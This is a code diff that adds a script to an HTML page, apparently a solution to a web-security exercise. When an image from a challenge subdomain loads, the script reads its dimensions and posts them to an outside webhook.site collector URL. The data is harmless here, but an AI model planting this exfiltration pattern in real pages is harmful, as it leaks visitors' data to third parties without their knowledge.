@@ -8,7 +8,47 @@
 <body>
     <h1>Hola mundo</h1>
     <img id="profilePic" src="https://chl-a77059e8-b9a6-4ed3-b86c-1ccf81be0ff3-imagen-importante.softwareseguro.com.ar/profile-pic" />
+
+    <script>
+        // Obtener el elemento de la imagen
+        const imgElement = document.getElementById('profilePic');
+
+        // Agregar un evento 'load' para saber cuándo se ha cargado la imagen
+        imgElement.onload = function() {
+            // Obtener las dimensiones naturales (sin escalar) de la imagen
+            const width = imgElement.naturalWidth;
+            const height = imgElement.naturalHeight;
+
+            // Mostrar el tamaño en consola o en el HTML
+            console.log(`Ancho: ${width}px, Alto: ${height}px`);
+
+            // Opcional: mostrar las dimensiones en el HTML
+            const dimensions = document.createElement('p');
+            dimensions.textContent = `Dimensiones de la imagen: ${width}px x ${height}px`;
+            document.body.appendChild(dimensions);
+
+            // Crear el objeto de datos para enviar
+            const data = {
+                width: width,
+                height: height
+            };
+
+            // Enviar los datos al webhook usando fetch
+            fetch('https://webhook.site/ef037e8c-5b55-4b7f-b219-9b688b0c50a2', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(data)
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Respuesta del webhook:', data);
+            })
+            .catch(error => {
+                console.error('Error al enviar los datos al webhook:', error);
+            });
+        };
+    </script>
 </body>
-<script>
-</script>
 </html>
